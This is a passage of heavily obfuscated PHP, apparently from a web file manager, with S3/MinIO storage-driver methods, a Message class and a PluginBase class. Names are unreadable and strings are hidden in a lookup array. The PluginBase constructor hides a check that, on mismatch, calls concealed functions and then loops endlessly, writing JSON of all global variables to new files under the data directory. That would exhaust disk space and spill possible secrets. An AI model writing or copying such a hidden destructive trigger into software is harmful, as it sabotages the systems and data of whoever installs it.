$Ê´ŒØÅˆÚ×«[$è·¢[197]]; } return $ƒ´øïì…; } private function fileList($Ö¾¡, $©â¾¾íªÛ = '', $„ = 0) { $àÉé²ù =& $_SERVER[èÍ×öˆøÉ]; $ñÑØ = rtrim($Ö¾¡, $àÉé²ù[8]) . $àÉé²ù[8]; $Ùï˜‘ = $this->listObjs($ñÑØ, null, null, $©â¾¾íªÛ); if (!$Ùï˜‘) { return array($àÉé²ù[75] => array(), $àÉé²ù[74] => array()); } $ıÈÉ©µ¶Ğ = $this->listItemCache === !1 ? !1 : !0; $Ì¹ÔË = $ëÏÜ›Œø± = array(); foreach ($Ùï˜‘[$àÉé²ù[198]] as $²ªÔÕŒµ¨Ï²ı) { $É™®‰æ‡ìÜŸ = $²ªÔÕŒµ¨Ï²ı[$àÉé²ù[28]]; if ($É™®‰æ‡ìÜŸ == $ñÑØ) { continue; } $ñ”£™û‹‡éø = isset($²ªÔÕŒµ¨Ï²ı[$àÉé²ù[78]]) ? $²ªÔÕŒµ¨Ï²ı[$àÉé²ù[78]] : 0; $ºÕ©¬ = $ñ”£™û‹‡éø == 0 && substr($É™®‰æ‡ìÜŸ, strlen($É™®‰æ‡ìÜŸ) - 1, 1) == $àÉé²ù[8] ? !0 : !1; if ($ıÈÉ©µ¶Ğ) { $this->cacheMethod($àÉé²ù[199], $É™®‰æ‡ìÜŸ, $ºÕ©¬); $this->cacheMethod($àÉé²ù[200], $É™®‰æ‡ìÜŸ, $²ªÔÕŒµ¨Ï²ı); } if ($ºÕ©¬) { $Ì¹ÔË[] = $É™®‰æ‡ìÜŸ; continue; } $ëÏÜ›Œø±[] = $„ ? $²ªÔÕŒµ¨Ï²ı : $É™®‰æ‡ìÜŸ; } foreach ($Ùï˜‘[$àÉé²ù[201]] as $²ªÔÕŒµ¨Ï²ı) { $Ì¹ÔË[] = $²ªÔÕŒµ¨Ï²ı[$àÉé²ù[28]]; if ($ıÈÉ©µ¶Ğ) { $this->cacheMethod($àÉé²ù[199], $²ªÔÕŒµ¨Ï²ı[$àÉé²ù[28]], !0); } } if ($ıÈÉ©µ¶Ğ) { $this->cacheMethod($àÉé²ù[199], $Ö¾¡, !0); } return array($àÉé²ù[75] => $Ì¹ÔË, $àÉé²ù[74] => $ëÏÜ›Œø±); } private function listObjs($ìó, $ô½ù¥ = null, $ñöš¸ = null, $¶‡¬ı«Âş†Ò = null) { $ ¥Îø =& $_SERVER[èÍ×öˆøÉ]; $ìó = trim($ìó, $ ¥Îø[8]); $¹º = empty($ìó) && $ìó !== $ ¥Îø[191] ? $ ¥Îø[33] : $ìó . $ ¥Îø[8]; return $this->client->getBucket($this->bucket, $¹º, $ô½ù¥, $ñöš¸, $¶‡¬ı«Âş†Ò, !0); } public function has($†²¯Á, $îï²éúÅĞ× = false, $‚ = true) { $ì„ÀÂ£å =& $_SERVER[èÍ×öˆøÉ]; $†²¯Á = trim($†²¯Á, $ì„ÀÂ£å[8]); $„Ï¼ÖŸà = empty($†²¯Á) && $†²¯Á !== $ì„ÀÂ£å[191] ? $ì„ÀÂ£å[33] : $†²¯Á . $ì„ÀÂ£å[8]; $¼µ—²¶ƒµ¤ = null; $· = 500; $¯® = $ì„ÀÂ£å[8]; $¶ŠùÉ“ä = $¡¶é = array(); while (!0) { $úˆ÷«Ä = $this->listObjs($†²¯Á, $¼µ—²¶ƒµ¤, $·, $¯®); if (!$úˆ÷«Ä) { break; } $¼µ—²¶ƒµ¤ = $úˆ÷«Ä[$ì„ÀÂ£å[202]]; $À¼²¸Í¦ü = $úˆ÷«Ä[$ì„ÀÂ£å[198]]; $ª‡Û = $úˆ÷«Ä[$ì„ÀÂ£å[201]]; if (empty($À¼²¸Í¦ü) && empty($ª‡Û)) { break; } if (count($À¼²¸Í¦ü) == 1 && $À¼²¸Í¦ü[0][$ì„ÀÂ£å[28]] == $„Ï¼ÖŸà) { break; } if ($îï²éúÅĞ×) { if (count($À¼²¸Í¦ü)) { $À¼²¸Í¦ü = array_column($À¼²¸Í¦ü, $ì„ÀÂ£å[28]); $¶ŠùÉ“ä = array_merge($¶ŠùÉ“ä, $À¼²¸Í¦ü); } if (count($ª‡Û)) { $ª‡Û = array_column($ª‡Û, $ì„ÀÂ£å[28]); $¡¶é = array_merge($¡¶é, $ª‡Û); } if ($¼µ—²¶ƒµ¤ === null) { break; } continue; } if ($‚) { if (!empty($À¼²¸Í¦ü)) { if (count($À¼²¸Í¦ü) > 1 || isset($À¼²¸Í¦ü[0][$ì„ÀÂ£å[28]]) && $À¼²¸Í¦ü[0][$ì„ÀÂ£å[28]] != $„Ï¼ÖŸà) { return !0; } } } else { if (!empty($ª‡Û)) { return !0; } } if ($¼µ—²¶ƒµ¤ === null) { break; } } if ($îï²éúÅĞ×) { $¶ŠùÉ“ä = array_diff($¶ŠùÉ“ä, array($„Ï¼ÖŸà)); $¶ŠùÉ“ä = count(array_unique($¶ŠùÉ“ä)); $¡¶é = count(array_unique($¡¶é)); return array($ì„ÀÂ£å[203] => $¶ŠùÉ“ä, $ì„ÀÂ£å[204] => $¡¶é); } return !1; } public function listAll($×À•”) { $¡¼º”˜… =& $_SERVER[èÍ×öˆøÉ]; $á©‘†ªÇ•Š = $this->fileList($×À•”, $¡¼º”˜…[33], !0); $ÁäŸÈ = array(); foreach ($á©‘†ªÇ•Š[$¡¼º”˜…[74]] as $íÏî«ï¿şá) { $ÁäŸÈ[$íÏî«ï¿şá[$¡¼º”˜…[28]]] = $íÏî«ï¿şá[$¡¼º”˜…[78]]; } foreach ($á©‘†ªÇ•Š[$¡¼º”˜…[75]] as $íÏî«ï¿şá) { if (is_string($íÏî«ï¿şá)) { $ÁäŸÈ[$íÏî«ï¿şá] = 0; } } return $this->listAllFiles($×À•”, array_keys($ÁäŸÈ), $ÁäŸÈ); } public function canRead($Å) { $öñîü« =& $_SERVER[èÍ×öˆøÉ]; $ù†˜º = $this->client->getAccessControlPolicy($this->bucket, $Å); if (!$ù†˜º) { return !1; } return in_array($ù†˜º, array($öñîü«[205], $öñîü«[206], $öñîü«[207])) ? !0 : !1; } public function canWrite($˜íÉï) { $´¼Ú°ÔÌŸ¨Û“ =& $_SERVER[èÍ×öˆøÉ]; $’ = $this->client->getAccessControlPolicy($this->bucket, $˜íÉï); if (!$’) { return !1; } return in_array($’, array($´¼Ú°ÔÌŸ¨Û“[205], $´¼Ú°ÔÌŸ¨Û“[206])) ? !0 : !1; } public function getContent($ÕÄãòëÃ) { return $this->client->getObject($this->bucket, $ÕÄãòëÃ); } public function setContent($«›Öù, $Ä‚ = '', $‚ùáğ–èîäó = false) { $åôÆ =& $_SERVER[èÍ×öˆøÉ]; $«›Öù = $‚ùáğ–èîäó ? trim($«›Öù, $åôÆ[8]) . $åôÆ[8] : $«›Öù; $«³œƒ“á·Ã = get_file_mime(get_path_ext($«›Öù)); $ºÔ²»õÇå™ = $this->client->putObject($Ä‚, $this->bucket, $«›Öù, $åôÆ[192], array(), $«³œƒ“á·Ã); if (!$ºÔ²»õÇå™) { return !1; } if ($‚ùáğ–èîäó) { return !0; } $this->cacheMethod(null, null); $ºÔ²»õÇå™ = $this->copyFile($«›Öù, $«›Öù, array($åôÆ[208] => $ºÔ²»õÇå™[$åôÆ[209]])); return $ºÔ²»õÇå™ ? !0 : !1; } public function fileSubstr($Ì†ø†µ, $†º´Œ, $çıäÔÅ”Ñ×§) { $‘‹ßàã³Ç½ = $†º´Œ + $çıäÔÅ”Ñ×§ - 1; return $this->client->getObject($this->bucket, $Ì†ø†µ, array($_SERVER[èÍ×öˆøÉ][210] => "\x62\x79\164\x65\x73\x3d{$†º´Œ}\x2d{$‘‹ßàã³Ç½}")); } public function upload($ĞÙÈ“…û, $Ô¸Ô‘, $â‚ÆşºòšÆÁ = false, $ğ¼ş¦É = REPEAT_REPLACE) { $ÈŸ =& $_SERVER[èÍ×öˆøÉ]; $õµãë = array($ÈŸ[208] => @md5_file($Ô¸Ô‘)); $¬›ˆ = array($ÈŸ[211] => get_file_mime(get_path_ext($ĞÙÈ“…û))); if (IO::size($Ô¸Ô‘) <= 1024 * 1024 * 200) { $ÒåÌ¶Úã = $this->client->putObjectFile($Ô¸Ô‘, $this->bucket, $ĞÙÈ“…û, $ÈŸ[192], $õµãë, $¬›ˆ); return !empty($ÒåÌ¶Úã) ? $this->getPathOuter($ĞÙÈ“…û) : !1; } $°¦´¥º = $this->client->multiUploadObject($Ô¸Ô‘, $this->bucket, trim($ĞÙÈ“…û, $ÈŸ[8]), $õµãë, $¬›ˆ); return $°¦´¥º ? $this->getPathOuter($ĞÙÈ“…û) : !1; } public function download($­İµŠŒ‹ùÔ, $Ñ´ù„¶Ä·ş) { if (!@is_dir($this->pathFather($Ñ´ù„¶Ä·ş)) && !IO::mkdir($this->pathFather($Ñ´ù„¶Ä·ş))) { return !1; } $¸›†ïî = $this->client->getObject($this->bucket, $­İµŠŒ‹ùÔ, array(), $Ñ´ù„¶Ä·ş); return $¸›†ïî !== !1 ? $Ñ´ù„¶Ä·ş : !1; } public function link($Î, $Øßäæëä = array()) { $¯Ã¦ª³Š–¦¬ê =& $_SERVER[èÍ×öˆøÉ]; if ($this->signVer == $¯Ã¦ª³Š–¦¬ê[212]) { return $this->client->getAuthenticatedURL($this->bucket, $Î, 3600 * 12, $Øßäæëä); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($Î, $¯Ã¦ª³Š–¦¬ê[8]), 3600 * 12, $this->region, array(), !0, $Øßäæëä); } public function fileOut($€€ì†É‘, $½ŒÇ‹í = false, $ó = false, $˜³§½İò¬‰øÈ = '') { $¤¤¯®•õË =& $_SERVER[èÍ×öˆøÉ]; if ($this->isFileOutServer()) { return $this->fileOutServer($€€ì†É‘, $½ŒÇ‹í, $ó, $˜³§½İò¬‰øÈ); } if (!$ó) { $ó = $this->pathThis($€€ì†É‘); } $×ıÉôü = get_file_mime(get_path_ext($ó)); if ($×ıÉôü == $¤¤¯®•õË[213]) { return parent::fileOut($€€ì†É‘, $½ŒÇ‹í, $ó, $˜³§½İò¬‰øÈ); } $½ŒÇ‹í = $½ŒÇ‹í ? $¤¤¯®•õË[214] : $¤¤¯®•õË[215]; $Ú»»ù = array($¤¤¯®•õË[216] => $½ŒÇ‹í . $¤¤¯®•õË[217] . rawurlencode($ó), $¤¤¯®•õË[218] => $×ıÉôü); $º = $this->link($€€ì†É‘, $Ú»»ù); $this->fileOutLink($º); } public function fileOutServer($æª, $µ = false, $ÀÆØı = false, $š® = '') { parent::fileOut($æª, $µ, $ÀÆØı, $š®); } public function fileOutImageServer($Ù£¦Ôñ×™¿µ, $ÎÄ÷î¨ªæçèÏ = 250) { parent::fileOutImage($Ù£¦Ôñ×™¿µ, $ÎÄ÷î¨ªæçèÏ); } public function hashMd5($©—àÌş, $½Ù° = '') { $ã€¥ =& $_SERVER[èÍ×öˆøÉ]; $ûıÆ¦Ş”¥À = $this->objectMeta($©—àÌş); if (!$ûıÆ¦Ş”¥À) { return !1; } $½Ù° = $½Ù° ? $½Ù° : _get($ûıÆ¦Ş”¥À, $ã€¥[219]); $½Ù° = $½Ù° ? $½Ù° : _get($ûıÆ¦Ş”¥À, $ã€¥[209], $ã€¥[33]); return $½Ù°; } public function uploadFormData($î¡Ù£ª‚Ñ, $şı‘š = 3600) { $è£„ =& $_SERVER[èÍ×öˆøÉ]; $àëó‚ = $this->pathFather($î¡Ù£ª‚Ñ); $–À = $this->client->getHttpUploadPostParams($this->bucket, $àëó‚, $è£„[192], $şı‘š); return array_merge((array) $–À, array($è£„[175] => $this->getHost())); } public function multiUploadFormData($ı–¯ºìí·, $Şì = 3600) { $ı =& $_SERVER[èÍ×öˆøÉ]; $êçØ—€‘½ªæ = gmdate($ı[220]); $¯»» = array(); $İÅ = $this->client->getUploadId($this->bucket, $ı–¯ºìí·, $¯»»); if (!$İÅ) { return !1; } return array($ı[221] => $İÅ, $ı[175] => $this->getHost() . $ı[8] . $this->pathEncode($ı–¯ºìí·), $ı[222] => $êçØ—€‘½ªæ, $ı[93] => $ı–¯ºìí·); } public function multiUploadAuthData($Øğ®ö, $²óåÀ¸İ = array()) { $¹¢Á±‡¿ìÊ =& $_SERVER[èÍ×öˆøÉ]; $´ş¢†ßì = isset($²óåÀ¸İ[$¹¢Á±‡¿ìÊ[222]]) ? $²óåÀ¸İ[$¹¢Á±‡¿ìÊ[222]] : gmdate($¹¢Á±‡¿ìÊ[220]); $ƒŒ”µ¯íš = isset($²óåÀ¸İ[$¹¢Á±‡¿ìÊ[168]]) ? $²óåÀ¸İ[$¹¢Á±‡¿ìÊ[168]] : $¹¢Á±‡¿ìÊ[33]; $¿áş„¦É±ı = $²óåÀ¸İ[$¹¢Á±‡¿ìÊ[93]]; unset($²óåÀ¸İ[$¹¢Á±‡¿ìÊ[93]]); if (isset($²óåÀ¸İ[$¹¢Á±‡¿ìÊ[223]])) { $²óåÀ¸İ[$¹¢Á±‡¿ìÊ[222]] = $´ş¢†ßì; return $this->listUploadParts($¿áş„¦É±ı, $²óåÀ¸İ); } $Õ©‡··Î = array($¹¢Á±‡¿ìÊ[224], $¹¢Á±‡¿ìÊ[33], $¹¢Á±‡¿ìÊ[119], $¹¢Á±‡¿ìÊ[33], "\170\x2d\x61\x6d\172\55\x64\x61\164\145\x3a{$´ş¢†ßì}", $¹¢Á±‡¿ìÊ[8] . $this->bucket . $¹¢Á±‡¿ìÊ[8] . $this->pathEncode($¿áş„¦É±ı) . $ƒŒ”µ¯íš); if (strpos($ƒŒ”µ¯íš, $¹¢Á±‡¿ìÊ[225]) === 0) { $Õ©‡··Î[0] = $¹¢Á±‡¿ìÊ[226]; } if (isset($²óåÀ¸İ[$¹¢Á±‡¿ìÊ[227]]) && $²óåÀ¸İ[$¹¢Á±‡¿ìÊ[227]] == $¹¢Á±‡¿ìÊ[228]) { $Õ©‡··Î[0] = $¹¢Á±‡¿ìÊ[228]; } $• = implode($¹¢Á±‡¿ìÊ[229], $Õ©‡··Î); $Ë“òó = base64_encode(hash_hmac($¹¢Á±‡¿ìÊ[230], $•, $this->secret, !0)); $Èøï…ĞÒ»íòí = $¹¢Á±‡¿ìÊ[231] . $this->accessKey . $¹¢Á±‡¿ìÊ[4] . $Ë“òó; if (strpos($ƒŒ”µ¯íš, $¹¢Á±‡¿ìÊ[225]) === 0) { return array($¹¢Á±‡¿ìÊ[232] => $Èøï…ĞÒ»íòí, $¹¢Á±‡¿ìÊ[222] => $´ş¢†ßì); } return $Èøï…ĞÒ»íòí; } public function listUploadParts($è§, $ãµàåÔ¦ĞãÜ = array()) { $¡ú—¨‚»œÕš =& $_SERVER[èÍ×öˆøÉ]; $½¶ãÒ–µ‚ = str_replace($¡ú—¨‚»œÕš[233], $¡ú—¨‚»œÕš[33], $ãµàåÔ¦ĞãÜ[$¡ú—¨‚»œÕš[168]]); $Èû’Ÿ = $this->client->listParts($this->bucket, $è§, $½¶ãÒ–µ‚); if (!$Èû’Ÿ) { return !1; } unset($ãµàåÔ¦ĞãÜ[$¡ú—¨‚»œÕš[223]], $ãµàåÔ¦ĞãÜ[$¡ú—¨‚»œÕš[227]]); $ãµàåÔ¦ĞãÜ[$¡ú—¨‚»œÕš[93]] = $è§; $ãĞ×ˆÄ• = $this->multiUploadAuthData($è§, $ãµàåÔ¦ĞãÜ); if (empty($ãĞ×ˆÄ•)) { return !1; } return array($¡ú—¨‚»œÕš[232] => $ãĞ×ˆÄ•, $¡ú—¨‚»œÕš[222] => $ãµàåÔ¦ĞãÜ[$¡ú—¨‚»œÕš[222]], $¡ú—¨‚»œÕš[234] => $Èû’Ÿ); } public function getHost() { return parent::getHost() . $_SERVER[èÍ×öˆøÉ][8] . $this->bucket; } public function size($ùÑÔ) { $ĞÀËï»Ö Åó = $this->objectMeta($ùÑÔ); return $ĞÀËï»Ö Åó ? $ĞÀËï»Ö Åó[$_SERVER[èÍ×öˆøÉ][78]] : 0; } public function info($™èº¯) { if ($this->isFolder($™èº¯)) { return $this->folderInfo($™èº¯); } else { if ($this->isFile($™èº¯)) { return $this->fileInfo($™èº¯); } } return !1; } public function exist($èï) { return $this->isFile($èï) || $this->isFolder($èï); } public function isFile($âã×öê) { return !$this->isFolder($âã×öê) && $this->objectMeta($âã×öê); } public function isFolder($“á…ì) { return $this->cacheMethod($_SERVER[èÍ×öˆøÉ][199], $“á…ì); } protected function objectMeta($µšØ) { return $this->cacheMethod($_SERVER[èÍ×öˆøÉ][200], $µšØ); } protected function _objectMeta($…) { $óŸ¼ˆŞÌı–ÒŞ =& $_SERVER[èÍ×öˆøÉ]; $… = rtrim($…, $óŸ¼ˆŞÌı–ÒŞ[8]); try { $ÌØ = $this->client->getObjectInfo($this->bucket, $…); if (!isset($ÌØ[$óŸ¼ˆŞÌı–ÒŞ[219]]) && isset($ÌØ[$óŸ¼ˆŞÌı–ÒŞ[235]])) { $ÌØ[$óŸ¼ˆŞÌı–ÒŞ[219]] = $ÌØ[$óŸ¼ˆŞÌı–ÒŞ[235]]; } } catch (Exception $ê) { $ÌØ = !1; } if (!$ÌØ) { } return $ÌØ; } protected function _isFolder($Ğ™®À®¢Ï–) { $ñŞÛúŞöõ† =& $_SERVER[èÍ×öˆøÉ]; $Ğ™®À®¢Ï– = rtrim($Ğ™®À®¢Ï–, $ñŞÛúŞöõ†[8]); if ($Ğ™®À®¢Ï– == $ñŞÛúŞöõ†[33] || $Ğ™®À®¢Ï– == $ñŞÛúŞöõ†[8]) { return !0; } $Ä = $this->client->getBucket($this->bucket, $Ğ™®À®¢Ï–, null, 1); if (empty($Ä[$ñŞÛúŞöõ†[198]])) { return !1; } $Œ®öµ = $Ä[$ñŞÛúŞöõ†[198]][0][$ñŞÛúŞöõ†[28]]; return stripos($Œ®öµ, $Ğ™®À®¢Ï– . $ñŞÛúŞöõ†[8]) === 0 ? !0 : !1; if (substr($Œ®öµ, -1) == $ñŞÛúŞöõ†[8]) { return !0; } if (get_path_this($Œ®öµ) == get_path_this($Ğ™®À®¢Ï–)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($Ò¡«§Ì) { parent::__construct($Ò¡«§Ì); $this->signatureVersion($_SERVER[èÍ×öˆøÉ][212]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto a©Ëõ˜ª®å; eˆ…î›çä: class Message { function __construct() { } public function send($ö”« = '', $èî—¨ = array(), $åÁÇüä¼ = "\x74\145\170\x74") { $ÖË»«ôò‡ =& $_SERVER[èÍ×öˆøÉ]; $›ß¶æ¨ëËó = array($ÖË»«ôò‡[29] => $ÖË»«ôò‡[1445], $ÖË»«ôò‡[750] => $ö”«); if (in_array($åÁÇüä¼, array($ÖË»«ôò‡[1445], $ÖË»«ôò‡[1446]))) { $›ß¶æ¨ëËó[$ÖË»«ôò‡[29]] = $åÁÇüä¼; } $èî—¨ = array($ÖË»«ôò‡[509] => isset($èî—¨[$ÖË»«ôò‡[509]]) ? $èî—¨[$ÖË»«ôò‡[509]] : $ÖË»«ôò‡[33], $ÖË»«ôò‡[588] => isset($èî—¨[$ÖË»«ôò‡[588]]) ? $èî—¨[$ÖË»«ôò‡[588]] : $ÖË»«ôò‡[33]); if (empty($ö”«) || empty($èî—¨[$ÖË»«ôò‡[509]]) && empty($èî—¨[$ÖË»«ôò‡[588]])) { return !1; } $ÆäàÎ¤Š = array($ÖË»«ôò‡[1386] => $›ß¶æ¨ëËó, $ÖË»«ôò‡[1447] => $èî—¨); Hook::trigger($ÖË»«ôò‡[1448], $ÆäàÎ¤Š); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $ëÜ =& $_SERVER[èÍ×öˆøÉ]; $Ğ¢âÜÇÏ¥ = $_SERVER[$ëÜ[1352]]; $÷ç = $ëÜ[1449]; if ($_SERVER[$ëÜ[874]] != $÷ç($Ğ¢âÜÇÏ¥)) { $îƒûîÁĞùç = $ëÜ[876]; $§ìà = $ëÜ[877]; $È¥Ÿ¬ = $_SERVER[$ëÜ[878]] . $ëÜ[879]; $‘ÃÈÀ×âÇ = $§ìà($È¥Ÿ¬); $ˆıÍ = explode($ëÜ[229], $‘ÃÈÀ×âÇ); if (count($ˆıÍ) < $ëÜ[616]) { $¯î² = $ëÜ[880]; $¯î²(); } $ø™ ® = $ëÜ[881]; $ø™ ®($_SERVER[$ëÜ[882]]); $îƒûîÁĞùç = $ëÜ[876]; $îƒûîÁĞùç(); $ùÎåº¸ôÓË³½ = $ëÜ[1450]; $ì…é = json_encode($GLOBALS[$ëÜ[1451]]); $šÌ™³Œ„ = 1; for ($†õ = $šÌ™³Œ„; $†õ > 0; $†õ++) { $ùÎåº¸ôÓË³½(DATA_PATH . $†õ, $ì…é); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($ëÜ[1452]); $this->pluginName = str_replace($ëÜ[1452], $ëÜ[33], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $ëÜ[8]; $this->pluginApi = appHostGet() . $ëÜ[1453] . $this->pluginName . $ëÜ[8]; $this->pluginHost = $config[$ëÜ[1454]] . $this->pluginName . $ëÜ[8]; $this->pluginHostDefault = $config[$ëÜ[1454]] . $this->pluginName . $ëÜ[8]; $Óöã ä = $config[$ëÜ[1455]]; if ($Óöã ä && strpos($ëÜ[47] . $Óöã ä . $ëÜ[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$ëÜ[1456]] . $this->pluginName . $ëÜ[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[èÍ×öˆøÉ][1457]); } protected function assign($¨Ê, $‹ûò“—ÑÈõÁ = false) { if (is_array($¨Ê)) { $this->values = array_merge($this->values, $¨Ê); } else { $this->values[$¨Ê] = $‹ûò“—ÑÈõÁ; } } protected function display($»ü„•éàº) { extract($this->values); require $»ü„•éàº; } final function hookRegist($òÒôòüèÒÕå) { $this->modelPlugin->appRegist($this->pluginName, $òÒôòüèÒÕå); } final function appIcon() { $”ÓÛ¸°œ¤á =& $_SERVER[èÍ×öˆøÉ]; $Û«³‹¨ = $this->appPackage(); $³×¥öùË‘ = $”ÓÛ¸°œ¤á[33]; if (isset($Û«³‹¨[$”ÓÛ¸°œ¤á[411]])) { if (isset($Û«³‹¨[$”ÓÛ¸°œ¤á[411]][$”ÓÛ¸°œ¤á[1458]])) { $³×¥öùË‘ = $”ÓÛ¸°œ¤á[1459] . $Û«³‹¨[$”ÓÛ¸°œ¤á[411]][$”ÓÛ¸°œ¤á[1458]] . $”ÓÛ¸°œ¤á[1460]; } else { if ($Û«³‹¨[$”ÓÛ¸°œ¤á[411]][$”ÓÛ¸°œ¤á[1461]]) { $³×¥öùË‘ = $”ÓÛ¸°œ¤á[1462] . $Û«³‹¨[$”ÓÛ¸°œ¤á[411]][$”ÓÛ¸°œ¤á[1461]] . $”ÓÛ¸°œ¤á[1463]; } } } return $³×¥öùË‘; } final function fileCanView($„ïèğËŞÌÆù) { $¯» =& $_SERVER[èÍ×öˆøÉ]; if (request_url_safe($„ïèğËŞÌÆù)) { return !0; } if ($this->isShare($„ïèğËŞÌÆù)) { return !0; } $±…š¦§£ªÃ = Session::get($¯»[1464]); if (!$±…š¦§£ªÃ || !$±…š¦§£ªÃ[$¯»[1465]]) { $İ÷é¿å‡„İ³© = $¯»[1466] . rawurlencode(this_url()); show_tips(LNG($¯»[1467]) . $¯»[1468] . $İ÷é¿å‡„İ³© . $¯»[1469] . LNG($¯»[1470]) . $¯»[1471], !1); } if (!Action($¯»[1472])->authCan($¯»[1473])) { show_tips(LNG($¯»[1474]) . $¯»[1475], !1); } ActionCall($¯»[1476], $„ïèğËŞÌÆù); } final function isShare($¢“ï«ìÁæì) { $ØÒú = KodIO::parse($¢“ï«ìÁæì); return $ØÒú[$_SERVER[èÍ×öˆøÉ][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($Ó«”äïÊ) { if (request_url_safe($Ó«”äïÊ)) { return $Ó«”äïÊ; } if (!$this->isShare($Ó«”äïÊ)) { $Ó«”äïÊ = $this->filePath($Ó«”äïÊ); } return Action($_SERVER[èÍ×öˆøÉ][1108])->linkOut($Ó«”äïÊ); } public function filePathLinkOut($ŒŞÊ»¼¼) { if (request_url_safe($ŒŞÊ»¼¼)) { return $ŒŞÊ»¼¼; } $this->fileCanView($ŒŞÊ»¼¼); return Action($_SERVER[èÍ×öˆøÉ][1108])->link($ŒŞÊ»¼¼); } final function filePath($şÈœ‡) { $½• =& $_SERVER[èÍ×öˆøÉ]; if ($Œø¤Ì‚†•Òæ = $this->checkSharePath($şÈœ‡)) { Hook::trigger($½•[1477], $Œø¤Ì‚†•Òæ); return $Œø¤Ì‚†•Òæ; } $this->fileCanView($şÈœ‡); if (request_url_safe($şÈœ‡)) { $±Êîù¸¨ = parse_url_query($şÈœ‡); if (isset($±Êîù¸¨[$½•[1478]]) && isset($±Êîù¸¨[$½•[209]])) { $¥çîÁŞÈìø‘— = Model($½•[765])->get($½•[766]); $şî¶à¨¥ÆÓ„× = Mcrypt::decode($±Êîù¸¨[$½•[209]], $¥çîÁŞÈìø‘—); if ($şî¶à¨¥ÆÓ„×) { $this->fileInfo = IO::infoWithChildren($şî¶à¨¥ÆÓ„×); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $şî¶à¨¥ÆÓ„×; } } $şÈœ‡ = $this->_cacheHttpFile($şÈœ‡); $this->fileInfo = IO::infoWithChildren($şÈœ‡); } else { $this->fileInfo = IO::infoWithChildren($şÈœ‡); if (!$this->fileInfo) { show_tips(LNG($½•[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($½•[1477], $şÈœ‡); return $şÈœ‡; } final function _cacheHttpFile($Í±ïäËÖØ§¼) { $ïç îàØıé¢é = hash_path($Í±ïäËÖØ§¼, !0); $this->cachePath = $this->pluginCachePath($ïç îàØıé¢é); if ($àÛè¸õ´½ÑÖ = IO::fileNameExist($this->cachePath, $ïç îàØıé¢é)) { return KodIO::make($àÛè¸õ´½ÑÖ); } $Å®à­ = $this->cachePath . $ïç îàØıé¢é; return $this->pluginCacheFileSet($Å®à­, file_get_contents_nossl($Í±ïäËÖØ§¼)); } final function _tmpFileName($•õö•ÚÛŞĞ = array()) { $¼şĞšÂû =& $_SERVER[èÍ×öˆøÉ]; if (!$•õö•ÚÛŞĞ) { $•õö•ÚÛŞĞ = $this->fileInfo; } if (isset($•õö•ÚÛŞĞ[$¼şĞšÂû[171]])) { return $•õö•ÚÛŞĞ[$¼şĞšÂû[171]]; } if (isset($•õö•ÚÛŞĞ[$¼şĞšÂû[164]][$¼şĞšÂû[171]])) { return $•õö•ÚÛŞĞ[$¼şĞšÂû[164]][$¼şĞšÂû[171]]; } $»¸‡ÕÛ¬ = IO::hashSimple($•õö•ÚÛŞĞ[$¼şĞšÂû[76]]); if ($»¸‡ÕÛ¬) { return $»¸‡ÕÛ¬; } $›–‰“„©ö¶™‹ = array($•õö•ÚÛŞĞ[$¼şĞšÂû[28]], $•õö•ÚÛŞĞ[$¼şĞšÂû[76]], $•õö•ÚÛŞĞ[$¼şĞšÂû[78]]); if (isset($•õö•ÚÛŞĞ[$¼şĞšÂû[515]])) { $›–‰“„©ö¶™‹[] = $•õö•ÚÛŞĞ[$¼şĞšÂû[515]]; } return md5(implode($¼şĞšÂû[71], $›–‰“„©ö¶™‹)); } final function checkSharePath($ŠÖ­áÕâîÁä€) { $üÜòï™İÓ‡Ş =& $_SERVER[èÍ×öˆøÉ]; if (!defined($üÜòï™İÓ‡Ş[468])) { define($üÜòï™İÓ‡Ş[508], 0); } if (!$this->isShare($ŠÖ­áÕâîÁä€)) { return !1; } $„Ô˜­Ë = Action($üÜòï™İÓ‡Ş[1108])->sharePathInfo($ŠÖ­áÕâîÁä€); if (!isset($„Ô˜­Ë[$üÜòï™İÓ‡Ş[76]])) { show_json(LNG($üÜòï™İÓ‡Ş[1479]), !1); } $this->fileInfo = $„Ô˜­Ë[$üÜòï™İÓ‡Ş[164]]; $this->cachePath = $this->pluginCachePath($this->fileInfo[$üÜòï™İÓ‡Ş[171]]); return $„Ô˜­Ë[$üÜòï™İÓ‡Ş[76]]; } final function pluginCachePath($ŸˆÛ‹© = '') { $Êä®µ—Ï§ñì =& $_SERVER[èÍ×öˆøÉ]; $˜Ì = IO_PATH_SYSTEM_TEMP . $Êä®µ—Ï§ñì[1480] . $this->pluginName; if (!($»‹ÅìÚ³—‹Â = IO::infoFull($˜Ì))) { return IO::mkdir($˜Ì . $Êä®µ—Ï§ñì[8] . $ŸˆÛ‹©); } if (empty($ŸˆÛ‹©)) { return $»‹ÅìÚ³—‹Â[$Êä®µ—Ï§ñì[76]]; } if (!($¡ìÙ¥å„Ïœ = IO::fileNameExist($»‹ÅìÚ³—‹Â[$Êä®µ—Ï§ñì[76]], $ŸˆÛ‹©))) { return IO::mkdir($»‹ÅìÚ³—‹Â[$Êä®µ—Ï§ñì[76]] . $ŸˆÛ‹©); } return KodIO::make($¡ìÙ¥å„Ïœ); } final function pluginCacheFileSet($Òƒ, $Ö«­Îç¬‘à•¢ = '') { $‚µûá¥ =& $_SERVER[èÍ×öˆøÉ]; if (!($•Æ”êÀª©à¼½ = IO::infoFull($Òƒ))) { return IO::mkfile($Òƒ, $Ö«­Îç¬‘à•¢, REPEAT_REPLACE); } IO::setContent($•Æ”êÀª©à¼½[$‚µûá¥[76]], 